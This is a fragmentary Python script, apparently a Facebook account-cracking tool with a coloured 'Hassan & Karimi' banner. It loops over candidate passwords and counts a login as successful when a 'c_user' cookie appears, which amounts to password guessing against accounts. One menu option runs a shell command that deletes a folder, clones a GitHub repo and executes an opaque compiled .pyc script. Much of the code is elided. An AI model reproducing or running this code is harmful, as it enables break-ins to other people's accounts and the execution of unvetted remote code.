...
\033[1;34m════════════════════════════════════════════════
        \033[1;36mCREATED BY   :  Hassan & Karimi 
        \033[1;33mSTYLE        :  ALWAYS HAPPY
        \033[1;35mSYSTEM       :  DATA & WIFI
        \033[1;32mFACEBOK      :  Hassan
        \033[1;34mGITHUB       :  hfHf249
        \033[1;36mTOOLS STATUS :  FREE
        \033[1;35mTEAM         :  Hassn_ TEACH
        \033[1;32mVERSION      :  0.9
\033[1;34m════════════════════════════════════════════════\33[1;37m""")
...
def barie():
    ...
    if opt == '2':
        ...
        return None
    if opt == '1':
    	os.system('rm -rf Hassan && git clone https://github.com/Hassan_Karimi&& cd Hassan && python HfHf249_DUMP.pyc')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m[HkT] %s| [OK:- %s] \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
